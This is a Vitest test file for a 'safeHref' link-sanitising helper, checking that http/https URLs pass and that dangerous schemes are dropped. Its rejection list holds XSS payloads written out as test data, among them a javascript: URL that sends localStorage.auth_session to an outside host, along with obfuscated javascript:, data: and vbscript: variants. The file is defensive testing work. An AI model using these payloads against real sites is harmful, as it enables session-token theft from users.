import { describe, it, expect } from "vitest";
import { safeHref } from "@/lib/safe-href";

// Links built from tracked or user data (referrers, offer URLs) must never
// carry script: React 18 renders javascript: hrefs as-is.
describe("safeHref", () => {
  it("keeps http and https URLs", () => {
    expect(safeHref("https://example.com/a?b=1")).toBe("https://example.com/a?b=1");
    expect(safeHref("http://example.com")).toBe("http://example.com");
  });

  it("drops script and other schemes", () => {
    for (const bad of [
      "javascript://evil.com/%0Afetch('//x/?'+localStorage.auth_session)",
      "JavaScript:alert(1)",
      " javascript:alert(1)",
      "\tjava\nscript:alert(1)",
      "data:text/html,<script>alert(1)</script>",
      "vbscript:msgbox(1)",
      "//evil.com",
      "evil.com",
      "",
    ]) {
      expect(safeHref(bad), bad).toBeUndefined();
    }
  });

  it("handles missing values", () => {
    expect(safeHref(null)).toBeUndefined();
    expect(safeHref(undefined)).toBeUndefined();
  });
});
